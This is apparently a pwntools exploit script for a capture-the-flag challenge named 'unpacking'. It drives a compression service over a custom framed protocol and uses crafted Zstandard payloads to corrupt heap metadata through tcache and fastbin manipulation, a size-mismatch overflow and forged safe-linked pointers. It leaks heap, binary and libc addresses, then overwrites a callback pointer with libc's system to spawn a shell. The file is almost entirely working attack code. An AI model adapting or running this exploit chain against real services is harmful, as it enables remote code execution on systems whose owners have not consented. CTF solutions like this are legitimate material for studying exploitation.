#!/usr/bin/env python3
"""
Exploit script for the unpacking CTF challenge
Communication protocol:
- All messages: [1 byte length][length bytes data]
- Commands are sent to main process via stdin
- Responses come back via stdout
"""

from pwn import *
import zstandard as zstd
from collections import deque

elf = ELF("./main")
libc = ELF("./libc.so.6")

# Command enum
CMD_CREATE = 0
CMD_READ = 1
CMD_WRITE = 2
CMD_LIST = 3
CMD_DELETE = 4
CMD_UNCOMPRESS = 5
CMD_READ_UNCOMPRESSED = 6
CMD_DELETE_UNCOMPRESSED = 7
CMD_EXIT = 8
CMD_DEFAULT = 9

# Response status enum
STATUS_SUCCESS = 0
STATUS_NO_MEMORY = 1
STATUS_INVALID_LENGTH = 2
STATUS_NO_FREE_FILE = 3
STATUS_NO_SUCH_FILE = 4
STATUS_FILE_TOO_SMALL = 5
STATUS_BACKEND_SUCCESS = 100
STATUS_BACKEND_NO_MEMORY = 101
STATUS_BACKEND_NO_FREE_FILE = 102

STATUS_NAMES = {
    0: "Success",
    1: "NoMemory",
    2: "InvalidLength",
    3: "NoFreeFile",
    4: "NoSuchFile",
    5: "FileTooSmall",
    100: "BackendSuccess",
    101: "BackendNoMemory",
    102: "BackendNoFreeFile",
}


class UnpackingClient:
    """Client for interacting with the unpacking service"""

    def __init__(self, io):
        self.io = io

    def send_frame(self, data):
        """Send a frame with length prefix"""
        assert len(data) <= 255, "Frame too large"
        frame = p8(len(data)) + data
        self.io.send(frame)

    def recv_frame(self):
        """Receive a frame with length prefix"""
        length = u8(self.io.recv(1))
        if length == 0:
            return b""
        data = self.io.recv(length)
        return data

    def create(self, size):
        """
        Create a new compressed file
        Returns: (status, file_index or None)
        """
        assert size <= 0xFFFF, "File size too large"
        cmd = p8(CMD_CREATE) + p16(size, endian="little")
        self.send_frame(cmd)

        resp = self.recv_frame()
        status = u8(resp[0:1])

        if status == STATUS_SUCCESS and len(resp) == 2:
            file_idx = u8(resp[1:2])
            log.success(f"Created file #{file_idx} with size {size}")
            return status, file_idx
        else:
            log.error(f"Create failed: {STATUS_NAMES.get(status, status)}")
            return status, None

    def write(self, file_idx, offset, data):
        """
        Write data to a compressed file
        Returns: status
        """
        assert offset <= 0xFFFF, "Offset too large"
        assert len(data) <= 251, "Data too large for single frame"

        cmd = p8(CMD_WRITE) + p8(file_idx) + p16(offset, endian="little") + data
        self.send_frame(cmd)

        resp = self.recv_frame()
        status = u8(resp[0:1])

        if status == STATUS_SUCCESS:
            log.success(
                f"Written {len(data)} bytes to file #{file_idx} at offset {offset}"
            )
        else:
            log.error(f"Write failed: {STATUS_NAMES.get(status, status)}")

        return status

    def write_iteratively(self, file_idx, offset, data: bytes):
        """
        Write arbitrarily large data by chunking into <=251-byte frames.
        Returns: (final_status, bytes_written)
        Stops early and returns on the first non-success status.
        """
        assert isinstance(data, (bytes, bytearray)), "data must be bytes-like"
        total_len = len(data)
        written = 0

        while written < total_len:
            # Ensure we don't exceed 16-bit offset encoding
            if offset + written > 0xFFFF:
                log.error("Offset exceeds 16-bit limit during iterative write")
                return STATUS_INVALID_LENGTH, written

            chunk = data[written : written + 251]
            status = self.write(file_idx, offset + written, chunk)
            if status != STATUS_SUCCESS:
                return status, written
            written += len(chunk)

        return STATUS_SUCCESS, written

    def read(self, file_idx, offset):
        """
        Read data from a compressed file
        Returns: (status, data)
        """
        assert offset <= 0xFFFF, "Offset too large"

        cmd = p8(CMD_READ) + p8(file_idx) + p16(offset, endian="little")
        self.send_frame(cmd)

        resp = self.recv_frame()
        status = u8(resp[0:1])
        data = resp[1:]

        if status == STATUS_SUCCESS:
            log.success(
                f"Read {len(data)} bytes from file #{file_idx} at offset {offset}"
            )
        else:
            log.error(f"Read failed: {STATUS_NAMES.get(status, status)}")

        return status, data

    def delete(self, file_idx):
        """
        Delete a compressed file
        Returns: status
        """
        cmd = p8(CMD_DELETE) + p8(file_idx)
        self.send_frame(cmd)

        resp = self.recv_frame()
        status = u8(resp[0:1])

        if status == STATUS_SUCCESS:
            log.success(f"Deleted file #{file_idx}")
        else:
            log.error(f"Delete failed: {STATUS_NAMES.get(status, status)}")

        return status

    def uncompress(self, file_idx, wait=False):
        """
        Send compressed file to backend for decompression
        Response comes asynchronously
        Returns: status
        """
        cmd = p8(CMD_UNCOMPRESS) + p8(file_idx)
        self.send_frame(cmd)

        resp = self.recv_frame()
        status = u8(resp[0:1])

        if status == STATUS_SUCCESS:
            log.success(f"Sent file #{file_idx} for decompression")
            if wait is True:
                # Wait for backend response
                log.info("Waiting for backend response...")
                backend_resp = self.recv_frame()
                backend_status = u8(backend_resp[0:1])

                if (
                    backend_status == STATUS_BACKEND_SUCCESS
                    and len(backend_resp) >= 2 + 8
                ):
                    uncompressed_idx = u8(backend_resp[1:2])
                    uncompressed_size = u64(backend_resp[2 : 2 + 8], endian="little")
                    log.success(
                        f"Backend created uncompressed file #{uncompressed_idx} with size {uncompressed_size}"
                    )
                    return uncompressed_idx, uncompressed_size
                else:
                    log.error(
                        f"Backend failed: {STATUS_NAMES.get(backend_status, backend_status)}"
                    )
                    return backend_status, None
            else:
                log.info("Not waiting for backend response")
                return None, None
        else:
            log.error(f"Uncompress failed: {STATUS_NAMES.get(status, status)}")
            return status, None

    def read_uncompressed(self, file_idx, offset):
        """
        Read data from an uncompressed file
        Returns: (status, data)
        """
        assert offset <= 0xFFFF, "Offset too large"

        cmd = p8(CMD_READ_UNCOMPRESSED) + p8(file_idx) + p16(offset, endian="little")
        self.send_frame(cmd)

        resp = self.recv_frame()
        status = u8(resp[0:1])
        data = resp[1:]

        if status == STATUS_SUCCESS:
            log.success(f"Read {len(data)} bytes from uncompressed file #{file_idx}")
        else:
            log.error(f"Read uncompressed failed: {STATUS_NAMES.get(status, status)}")

        return status, data

    def delete_uncompressed(self, file_idx):
        """
        Delete an uncompressed file
        Returns: status
        """
        cmd = p8(CMD_DELETE_UNCOMPRESSED) + p8(file_idx)
        self.send_frame(cmd)

        resp = self.recv_frame()
        status = u8(resp[0:1])

        if status == STATUS_SUCCESS:
            log.success(f"Deleted uncompressed file #{file_idx}")
        else:
            log.error(f"Delete uncompressed failed: {STATUS_NAMES.get(status, status)}")

        return status

    def list_files(self):
        """
        List all files (compressed and uncompressed)
        Returns: (compressed_files, uncompressed_files)
        """
        cmd = p8(CMD_LIST)
        self.send_frame(cmd)

        compressed = []
        uncompressed = []

        # Receive file entries until we get the final status
        while True:
            resp = self.recv_frame()
            if len(resp) == 1:
                # Final status byte
                status = u8(resp[0:1])
                break
            elif len(resp) == 2 + 8:  # type + index + size
                file_type = u8(resp[0:1])
                file_idx = u8(resp[1:2])
                file_size = u64(resp[2 : 2 + 8], endian="little")

                if file_type == 0:
                    compressed.append((file_idx, file_size))
                else:
                    uncompressed.append((file_idx, file_size))

        log.info(f"Compressed files: {compressed}")
        log.info(f"Uncompressed files: {uncompressed}")

        return compressed, uncompressed

    def exit(self):
        """Exit the service"""
        cmd = p8(CMD_EXIT)
        self.send_frame(cmd)
        log.info("Sent exit command")

    def default(self, contents: bytes):
        """
        Send default command with arbitrary contents
        Returns: (status, data)
        """
        cmd = p8(CMD_DEFAULT) + contents
        self.send_frame(cmd)

        resp = self.recv_frame()
        status = u8(resp[0:1])
        data = resp[1:]

        if status == STATUS_SUCCESS:
            log.success(f"Default command succeeded, received {len(data)} bytes")
        else:
            log.error(f"Default command failed: {STATUS_NAMES.get(status, status)}")

        return status, data


def zstd_payload_bytes(payload: bytes, offset: int, pad_to: int) -> bytearray:
    """
    Return a bytearray containing a Zstandard-compressed frame that
    decompresses to exactly `pad_to` bytes with `payload` at `offset`.
    """
    uncompressed = fit({offset: payload}, length=pad_to, filler=b"Z")
    cctx = zstd.ZstdCompressor(level=3)
    compressed = cctx.compress(uncompressed)
    return bytearray(compressed)


def leak(client):
    file_ids = [None for _ in range(7)]
    for x in range(7):
        file_ids[x] = client.create(0x200)[1]

    payload = zstd_payload_bytes(payload=b"A" * 16, offset=0, pad_to=512)

    for x in file_ids:
        client.write_iteratively(x, 0, payload)

    uncompress_ids = [None for _ in range(4)]
    for x in file_ids[:4]:
        uncompress_ids[x] = client.uncompress(x, wait=True)[0]

    client.delete_uncompressed(uncompress_ids[2])

    _, data = client.read_uncompressed(uncompress_ids[1], 0x1F0)

    heap_leak = (u64(data[0x20 : 0x20 + 8]) << 12) - 0x1000
    tcache_key = u64(data[0x28 : 0x28 + 8])

    client.delete(file_ids[2])

    client.delete_uncompressed(uncompress_ids[1])

    _, data = client.read_uncompressed(uncompress_ids[0], 0x1F0)

    heap1_leak = (u64(data[0x20 : 0x20 + 8]) ^ ((heap_leak + 0x1000) >> 12)) - 0x29E0

    log.success(f"Tcache key: {hex(tcache_key)}")
    log.success(f"Thread 1 Heap leak: {hex(heap1_leak)}")
    log.success(f"Thread 2 Heap leak: {hex(heap_leak)}")

    # client.delete_uncompressed(uncompress_ids[3])
    # client.delete_uncompressed(uncompress_ids[0])

    for x in range(7):
        if x == 2:
            continue
        client.delete(file_ids[x])

    return heap1_leak, heap_leak, tcache_key


def exploit(client, heap1_leak, heap2_leak, tcache_key):
    file_ids = [client.create(0x90)[1] for _ in range(7)]

    _, victim1_comp = client.create(0x60)
    _, victim2_comp = client.create(0x60)
    _, victim3_comp = client.create(0x60)

    _, reuse = client.create(0x18)

    _, target = client.create(0x60)

    payload = zstd_payload_bytes(payload=b"A" * 8, offset=0, pad_to=0x58)

    deque(map(lambda x: client.write_iteratively(x, 0, payload), file_ids))

    client.write_iteratively(victim1_comp, 0, payload)
    client.write_iteratively(victim2_comp, 0, payload)
    client.write_iteratively(victim3_comp, 0, payload)

    packet_io = heap1_leak + 0x2310
    arena = heap2_leak + 0x8A0
    payload = zstd_payload_bytes(
        payload=p64(packet_io) + p64(0x60) + p64(arena), offset=0, pad_to=0x58
    )
    client.write_iteratively(target, 0, payload)

    # Create a fake chunk that also creates the reassembly chunk which will be re-used
    # for victim1.
    # This allows reuse and victim1 to be adjacent in memory.
    victim2, _ = client.uncompress(victim2_comp, wait=True)

    # Create the chunk that we'll use for the overflow
    payload = zstd_payload_bytes(payload=b"A" * 8, offset=0, pad_to=8)
    client.write_iteratively(reuse, 0, payload)
    reuse_uncompressed, _ = client.uncompress(reuse, wait=True)

    # The victim that we'll be overwriting
    victim1, _ = client.uncompress(victim1_comp, wait=True)
    # This will go into the tcache as well
    victim3, _ = client.uncompress(victim3_comp, wait=True)

    # Send 7 chunks to tcache
    uncompress_ids = [client.uncompress(x, wait=True)[0] for x in file_ids]
    deque(map(lambda x: client.delete_uncompressed(x), uncompress_ids))
    # map(lambda x: client.delete(x), file_ids)

    # Trigger the fastbin consolidation
    # free the victim1 chunk so that tcache has at least 2 chunks
    client.delete_uncompressed(victim1)
    # free the victim3 chunk
    client.delete_uncompressed(victim3)
    # Now, free the victim2 chunk
    client.delete_uncompressed(victim2)

    # This will trigger the fastbin -> tcache consolidation
    uncompress_ids.append(client.uncompress(file_ids[0], wait=True)[0])

    _, file1 = client.create(0x40)
    _, file2 = client.create(0xF0)

    payload = b"(\xb5/\xfd`\xf0\x02L\x00\x00\x10AA\x01\x00\xeb*\xc0\x02"
    client.write_iteratively(file1, 0, payload)

    overflow_off = 253
    fake_chunk = b"A" * 0x8
    fake_chunk += p64(0) + p64(0x25)
    fake_chunk += b"B" * 0x10
    fake_chunk += p64(0) + p64(0x65)
    target_addr = heap1_leak + 0x2C0
    fake_ptr = ((heap2_leak + 0x1000) >> 12) ^ target_addr
    fake_chunk += p64(fake_ptr)
    fake_chunk += b"C" * 0x50
    fake_chunk += p64(0) + p64(0x65)

    payload = zstd_payload_bytes(payload=fake_chunk, offset=overflow_off, pad_to=506)
    client.write_iteratively(file2, 0, payload)

    # Trigger the 11 vs 4 issue
    file1_uncomp, _ = client.uncompress(file1)

    sleep(1)

    # Trigger the overwrite
    file2_uncomp, _ = client.uncompress(file2)

    # This puts our fake chunk at the top of the tcache
    _, _ = client.uncompress(target, wait=True)

    # And this returns the chunk to us
    target, _ = client.uncompress(target, wait=True)

    # Now we read compressed file #1 to get some nice pointers
    _, data = client.read(0, 0x20)

    binary_leak = u64(data[0:8]) - 0x1AA7

    # Now we read compressed file #2 to get libc leak
    _, data = client.read(1, 0)

    libc_leak = u64(data[0:8]) - 0x203AC0
    libc.address = libc_leak

    log.success(f"Binary leak: {hex(binary_leak)}")
    log.success(f"Libc leak: {hex(libc_leak)}")

    # Now we write into compressed file 1 to overwrite the frame_send_callback
    payload = fit({0: p64(libc.symbols["system"])}, length=0x8, filler=b"A")
    client.write_iteratively(0, 0x68, payload)
    payload = fit({0: b";sh\x00", 0x8: p64(0x50) * 2})
    client.write_iteratively(0, 0, payload)

    # Call uncompress to get shell
    client.send_frame(p8(CMD_UNCOMPRESS) + p8(0))


PORT = 1024

if __name__ == "__main__":
    # Parse arguments
    host = args.HOST if args.REMOTE else "localhost"
    io = remote(host, PORT)

    context.log_level = "warning"

    try:
        client = UnpackingClient(io)
        heap1_leak, heap2_leak, tcache_key = leak(client)
        exploit(client, heap1_leak, heap2_leak, tcache_key)
        io.interactive()
    except Exception as e:
        log.exception(f"Exploit failed: {e}")
        io.close()
